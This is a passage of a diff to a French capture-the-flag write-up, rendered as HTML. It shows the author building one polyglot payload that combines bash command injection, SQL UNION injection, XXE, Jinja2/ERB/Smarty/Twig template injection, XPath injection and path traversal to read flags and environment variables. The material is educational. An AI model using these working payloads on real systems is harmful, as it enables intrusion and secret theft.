     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h2><p>On sort encore une fois du web pour une injection de commande en bash.
+</h3><p>On sort encore une fois du web pour une injection de commande en bash.
 Notre payload est injectée dans la commande suivante :</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -560,11 +571,11 @@ Il faut cependant faire attention à ce que la ligne de commande complète soit 
 <pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="err">&#39;</span><span class="p">;</span>env<span class="p">;</span><span class="c1">#</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>Avec ça, pas d&rsquo;erreur et une payload qui passe</p>
-<h2 class="heading-element" id="xxe"><span>XXE</span>
+<h3 class="heading-element" id="xxe"><span>XXE</span>
   <a href="#xxe" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h2><p>Pour le 12ème challenge on nous propose une vulnérabilité XXE.
+</h3><p>Pour le 12ème challenge on nous propose une vulnérabilité XXE.
 Nous devons lire le fichier <code>/dev/shm/flag.txt</code> en profitant d&rsquo;un parsing XML de notre payload.</p>
 <p>Voici le code du challenge :</p>
 <div class="highlight"><div class="chroma">
@@ -617,11 +628,11 @@ Nous devons lire le fichier <code>/dev/shm/flag.txt</code> en profitant d&rsquo;
 </div><p>La payload est la plus simple, et peut-être la plus connue, elle nous permet de définir un document <code>y</code> contenant une entité <code>x</code>. On assigne à cette entité une valeur externe, étant ici le fichier contenant le flag.
 On défini ensuite un noeud dans lequel affiché notre entité, ici <code>&lt;a&gt;&amp;x;&lt;/a&gt;</code></p>
 <p>Une attaque connue et &ldquo;simple&rdquo; mais qui nous posera problème plus tard&hellip;</p>
-<h2 class="heading-element" id="path-traversal"><span>Path Traversal</span>
+<h3 class="heading-element" id="path-traversal"><span>Path Traversal</span>
   <a href="#path-traversal" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h2><p>Pour finir la liste des challenges, nous avons une Path Traversal ! Celle-ci doit être effectuée à travers un code PHP :</p>
+</h3><p>Pour finir la liste des challenges, nous avons une Path Traversal ! Celle-ci doit être effectuée à travers un code PHP :</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -659,19 +670,19 @@ Pour accéder au processus courant, il faut aller dans le dossier <code>/proc/se
   </a>
 </h2><p>Maintenant que nous avons compris toutes les vulnérabilités, il nous faut &ldquo;fusionner&rdquo; les payloads.
 Je ne pense pas qu&rsquo;il y ai de méthodologie parfaite pour cela, mais je pense tout de même avoir fait comme la majorité des gens : on essaie de les imbriquer 1 par 1, puis on corrige ce qui créé des erreurs.</p>
-<h2 class="heading-element" id="le-début-du-commencement"><span>Le début du commencement</span>
+<h3 class="heading-element" id="le-début-du-commencement"><span>Le début du commencement</span>
   <a href="#le-d%c3%a9but-du-commencement" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h2><p>Mon objectif étant de montrer ce que j&rsquo;ai fait durant ce challenge, l&rsquo;ordre des payloads ne sera pas forcément le plus intelligent. En effet, je n&rsquo;avais pas forcément regardé tous les challenge individuellement lorsque j&rsquo;ai commencé, j&rsquo;étais surtout curieux.
+</h3><p>Mon objectif étant de montrer ce que j&rsquo;ai fait durant ce challenge, l&rsquo;ordre des payloads ne sera pas forcément le plus intelligent. En effet, je n&rsquo;avais pas forcément regardé tous les challenge individuellement lorsque j&rsquo;ai commencé, j&rsquo;étais surtout curieux.
 Vous pourrez d&rsquo;ailleurs voir que certaines payload vont changer au fur et à mesure. Une idée bonne lorsque l&rsquo;on fait 5 vulnérabilités à la fois peut avoir des conséquences désastreuses pour implémenter la 12ème, et l&rsquo;on devra alors tout retravailler.</p>
 <p>Je suis parti du premier challenge que j&rsquo;ai réussi : <strong>l&rsquo;injection bash</strong>
 Puis j&rsquo;ai ajouté l&rsquo;une des attaques que je connaissais le mieux pour aller petit à petit vers ce qui me semblait plus compliquer à implémenter.</p>
-<h2 class="heading-element" id="la-ssti-jinja2"><span>La SSTI Jinja2</span>
+<h3 class="heading-element" id="la-ssti-jinja2"><span>La SSTI Jinja2</span>
   <a href="#la-ssti-jinja2" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h2><p>Ma réflexion ici était la suivante :
+</h3><p>Ma réflexion ici était la suivante :
 Jinja n&rsquo;interpretera pas du tout le bash, il est donc possible d&rsquo;allier facilement l&rsquo;un puis l&rsquo;autre, notamment avec les 2 payloads que j&rsquo;ai présenté plus tôt.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -682,11 +693,11 @@ Jinja n&rsquo;interpretera pas du tout le bash, il est donc possible d&rsquo;all
 </div>
 </div><p>Ici aucune, entre autre grâce au commentaire.
 On peut passer à l&rsquo;étape suivante</p>
-<h2 class="heading-element" id="la-1ère-injection-sql"><span>La 1ère Injection SQL</span>
+<h3 class="heading-element" id="la-1ère-injection-sql"><span>La 1ère Injection SQL</span>
   <a href="#la-1%c3%a8re-injection-sql" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h2><p>On continue avec ce que je connais le mieux et la première injection SQL.
+</h3><p>On continue avec ce que je connais le mieux et la première injection SQL.
 On va profiter du fait que les 2 payloads (notre actuelle et celle de la SQLi) commencent par une simple quote.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -707,11 +718,11 @@ En fait c&rsquo;est dû au format de la commande injectée et à la syntaxe de l
 </span></span><span class="line"><span class="cl">ping: flag: Name or service not known</span></span></code></pre></td></tr></table>
 </div>
 </div><p>La syntaxe est donc valide. Et l&rsquo;erreur ne gêne pas pour la suite. L&rsquo;utilisation de point virgule <code>;</code> permet d&rsquo;enchaîner les commandes, avec ou sans erreur.</p>
-<h2 class="heading-element" id="et-la-2nde-injection-sql"><span>Et la 2nde Injection SQL</span>
+<h3 class="heading-element" id="et-la-2nde-injection-sql"><span>Et la 2nde Injection SQL</span>
   <a href="#et-la-2nde-injection-sql" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h2><p>Puisqu&rsquo;on a fait une injection SQL, autant faire la suivante.
+</h3><p>Puisqu&rsquo;on a fait une injection SQL, autant faire la suivante.
 Ici, je vais profiter de la quote ajoutée pour la 1ère injection SQL. Je vais considérer toute ma payload actuelle comme une string et finir mon injection SQL ensuite.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -721,11 +732,11 @@ Ici, je vais profiter de la quote ajoutée pour la 1ère injection SQL. Je vais 
 <pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="s1">&#39; UNION SELECT 1,2,flag FROM flag--;env;#{{lipsum.__globals__.os.environ.FLAG}}&#39;</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="n">flag</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">flag</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>Cela fonctionne car on peut comparer 2 valeurs ayant un type différent en SQL, notamment INTEGER &amp; TEXT.</p>
-<h2 class="heading-element" id="la-path-traversal"><span>La Path Traversal</span>
+<h3 class="heading-element" id="la-path-traversal"><span>La Path Traversal</span>
   <a href="#la-path-traversal" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h2><p>Si j&rsquo;avais été plus intelligent, j&rsquo;aurais du commencer par la <strong>Path Traversal</strong>.
+</h3><p>Si j&rsquo;avais été plus intelligent, j&rsquo;aurais du commencer par la <strong>Path Traversal</strong>.
 En effet, dû à son fonctionnement, cette payload doit être à la toute fin, car il n&rsquo;y a pas de moyen d&rsquo;ignorer les caractères qui viendront après notre chemin de fichier.
 Cela implique par contre qu&rsquo;il y aura beaucoup caractère au début de notre paylaod de path traversal.
 Heureusement pour nous, file_get_contents va normaliser/réduire le path. Si j&rsquo;ai un chemin <code>/a/b/../c</code>, il sera réduit avant d&rsquo;être lu et deviendra <code>/a/c</code> ne posant donc aucun problème, et ce même si le dossier <code>/a/b/</code> n&rsquo;existe pas.</p>
@@ -738,11 +749,11 @@ Heureusement pour nous, file_get_contents va normaliser/réduire le path. Si j&r
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="err">&#39;</span> <span class="n">UNION</span> <span class="n">SELECT</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="n">flag</span> <span class="n">FROM</span> <span class="n">flag</span><span class="o">--</span><span class="p">;</span><span class="n">env</span><span class="p">;</span><span class="err">#</span><span class="p">{{</span><span class="n">lipsum</span><span class="p">.</span><span class="n">__globals__</span><span class="p">.</span><span class="n">os</span><span class="p">.</span><span class="n">environ</span><span class="p">.</span><span class="n">FLAG</span><span class="p">}}</span><span class="err">&#39;</span> <span class="n">UNION</span> <span class="n">SELECT</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="n">flag</span> <span class="n">FROM</span> <span class="n">flag</span><span class="o">--</span> <span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="n">self</span><span class="o">/</span><span class="n">environ</span></span></span></code></pre></td></tr></table>
 </div>
-</div><h2 class="heading-element" id="erb"><span>ERB</span>
+</div><h3 class="heading-element" id="erb"><span>ERB</span>
   <a href="#erb" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h2><p>On profite pour l&rsquo;instant de n&rsquo;avoir aucune payload qui créé des erreurs avec une autre. Les SSTI de ERB vont bien dans ce sens avec leurs syntaxes qui ne provoquent pas d&rsquo;erreur chez les autre SSTI.
+</h3><p>On profite pour l&rsquo;instant de n&rsquo;avoir aucune payload qui créé des erreurs avec une autre. Les SSTI de ERB vont bien dans ce sens avec leurs syntaxes qui ne provoquent pas d&rsquo;erreur chez les autre SSTI.
 Le tout étant de placer la payload au bon endroit : dans notre cas entre la 2ème SQLi et la path traversal.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -751,11 +762,11 @@ Le tout étant de placer la payload au bon endroit : dans notre cas entre la 2è
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="err">&#39;</span> <span class="n">UNION</span> <span class="n">SELECT</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="n">flag</span> <span class="n">FROM</span> <span class="n">flag</span><span class="o">--</span><span class="p">;</span><span class="n">env</span><span class="p">;</span><span class="err">#</span><span class="p">{{</span><span class="n">lipsum</span><span class="p">.</span><span class="n">__globals__</span><span class="p">.</span><span class="n">os</span><span class="p">.</span><span class="n">environ</span><span class="p">.</span><span class="n">FLAG</span><span class="p">}}</span><span class="err">&#39;</span> <span class="n">UNION</span> <span class="n">SELECT</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="n">flag</span> <span class="n">FROM</span> <span class="n">flag</span><span class="o">--</span> <span class="o">&lt;%=</span> <span class="n">ENV</span><span class="p">[</span><span class="err">&#39;</span><span class="n">FLAG</span><span class="err">&#39;</span><span class="p">]</span> <span class="o">%&gt;/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="n">self</span><span class="o">/</span><span class="n">environ</span></span></span></code></pre></td></tr></table>
 </div>
-</div><h2 class="heading-element" id="smarty"><span>Smarty</span>
+</div><h3 class="heading-element" id="smarty"><span>Smarty</span>
   <a href="#smarty" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h2><p>Et voilà notre premier problème.
+</h3><p>Et voilà notre premier problème.
 Smarty utilise 1 seule pair de brackets (<code>{}</code>) pour sa syntaxe, donc lorsqu&rsquo;il croise la syntaxe de Jinja2 cela va provoquer une erreur.</p>
 <p>Il nous faut trouver un moyen de ne pas interpréter Jinja2 lorsque nous somme en Smarty. Et pour ça on va utiliser un outil qu&rsquo;on a déjà utilisé dans d&rsquo;autre payloads : Les commentaires.</p>
 <p>Smarty intègre les commentaires avec sa propre syntaxe <code>{* COMMENTAIRE *}</code>, en mettant la payload Jinja2 entre commentaire smarty, on peut donc se protéger. Puis on rajoute la payload smarty à côté de l&rsquo;ERB.</p>
@@ -766,11 +777,11 @@ Smarty utilise 1 seule pair de brackets (<code>{}</code>) pour sa syntaxe, donc 
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="err">&#39;</span> <span class="n">UNION</span> <span class="n">SELECT</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="n">flag</span> <span class="n">FROM</span> <span class="n">flag</span><span class="p">;</span><span class="n">env</span><span class="p">;</span><span class="err">#</span><span class="p">{</span><span class="o">*</span><span class="p">{{</span><span class="n">lipsum</span><span class="p">.</span><span class="n">__globals__</span><span class="p">.</span><span class="n">os</span><span class="p">.</span><span class="n">environ</span><span class="p">.</span><span class="n">FLAG</span><span class="p">}}</span><span class="o">*</span><span class="p">}</span><span class="err">&#39;</span> <span class="n">UNION</span> <span class="n">SELECT</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="n">flag</span> <span class="n">FROM</span> <span class="n">flag</span><span class="o">--</span> <span class="p">{</span><span class="nf">system</span><span class="p">(</span><span class="err">&#39;</span><span class="n">env</span><span class="err">&#39;</span><span class="p">)}</span> <span class="o">&lt;%=</span> <span class="n">ENV</span><span class="p">[</span><span class="err">&#39;</span><span class="n">FLAG</span><span class="err">&#39;</span><span class="p">]</span> <span class="o">%&gt;/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="n">self</span><span class="o">/</span><span class="n">environ</span></span></span></code></pre></td></tr></table>
 </div>
-</div><h2 class="heading-element" id="twig"><span>Twig</span>
+</div><h3 class="heading-element" id="twig"><span>Twig</span>
   <a href="#twig" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h2><p>Encore une difficulté, encore à cause de Jinja2.
+</h3><p>Encore une difficulté, encore à cause de Jinja2.
 Twig et Jinja2 utilise une syntaxe similaire en quasi tout point (en tout cas pour notre challenge). On ne peut donc même pas utiliser l&rsquo;astuce des commentaires.</p>
 <p>Mon idée a alors été de profiter des propriété des langages (Jinja2 + Python &amp; Twig + PHP). Voici les propriété qui m&rsquo;ont semblé intéréssantes :</p>
 <ul>
@@ -797,11 +808,11 @@ En effet, j&rsquo;ai rajouté des quote dans la payload juste avant la SQLi, et 
 <pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="err">&#39;</span> <span class="n">UNION</span> <span class="n">SELECT</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="n">flag</span> <span class="n">FROM</span> <span class="n">flag</span><span class="o">--</span><span class="p">;</span><span class="n">env</span><span class="p">;</span><span class="err">#&#39;</span> <span class="n">UNION</span> <span class="n">SELECT</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="n">flag</span> <span class="n">FROM</span> <span class="n">flag</span><span class="o">--</span> <span class="p">{</span><span class="nf">system</span><span class="p">(</span><span class="err">&#39;</span><span class="n">env</span><span class="err">&#39;</span><span class="p">)}{</span><span class="o">*</span><span class="p">{</span><span class="o">%</span> <span class="k">if</span> <span class="sc">&#39;1&#39;</span><span class="o">==</span><span class="mi">1</span> <span class="o">%</span><span class="p">}{{[</span><span class="err">&#39;</span><span class="n">env</span><span class="err">&#39;</span><span class="p">]</span><span class="o">|</span><span class="nf">filter</span><span class="p">(</span><span class="err">&#39;</span><span class="n">system</span><span class="err">&#39;</span><span class="p">)}}{</span><span class="o">%</span> <span class="n">endif</span> <span class="o">%</span><span class="p">}{{</span><span class="n">lipsum</span><span class="p">.</span><span class="n">__globals__</span><span class="p">.</span><span class="n">os</span><span class="p">.</span><span class="n">environ</span><span class="p">.</span><span class="n">FLAG</span><span class="p">}}</span><span class="o">*</span><span class="p">}</span> <span class="o">&lt;%=</span> <span class="n">ENV</span><span class="p">[</span><span class="err">&#39;</span><span class="n">FLAG</span><span class="err">&#39;</span><span class="p">]</span> <span class="o">%&gt;/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="n">self</span><span class="o">/</span><span class="n">environ</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>Parfait cela fonctionne bien !</p>
-<h2 class="heading-element" id="xpath"><span>Xpath</span>
+<h3 class="heading-element" id="xpath"><span>Xpath</span>
   <a href="#xpath" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h2><p>Jusqu&rsquo;ici je n&rsquo;ai donc utilisé que des simples quotes, une aubaine pour notre Xpah qui est le seul challenge où les doubles quotes sont absolument nécessaires !
+</h3><p>Jusqu&rsquo;ici je n&rsquo;ai donc utilisé que des simples quotes, une aubaine pour notre Xpah qui est le seul challenge où les doubles quotes sont absolument nécessaires !
 Et donc, il ne nous posera aucun problème de l&rsquo;ajouter un peu où l&rsquo;on veut. Dans mon cas je l&rsquo;ajoute juste après les injections SQL, il est important que la payload vienne après la 2ème injection sinon les doubles quotes seront interprétées dans celle-ci.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -811,17 +822,17 @@ Et donc, il ne nous posera aucun problème de l&rsquo;ajouter un peu où l&rsquo
 <pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="err">&#39;</span> <span class="n">UNION</span> <span class="n">SELECT</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="n">flag</span> <span class="n">FROM</span> <span class="n">flag</span><span class="o">--</span><span class="p">;</span><span class="n">env</span><span class="p">;</span><span class="err">#&#39;</span> <span class="n">UNION</span> <span class="n">SELECT</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="n">flag</span> <span class="n">FROM</span> <span class="n">flag</span><span class="o">--</span> <span class="s">&#34;]|//user[1=1]/password/text()|//user[1=&#34;</span><span class="p">{</span><span class="nf">system</span><span class="p">(</span><span class="err">&#39;</span><span class="n">env</span><span class="err">&#39;</span><span class="p">)}{</span><span class="o">*</span><span class="p">{</span><span class="o">%</span> <span class="k">if</span> <span class="sc">&#39;1&#39;</span><span class="o">==</span><span class="mi">1</span> <span class="o">%</span><span class="p">}{{[</span><span class="err">&#39;</span><span class="n">env</span><span class="err">&#39;</span><span 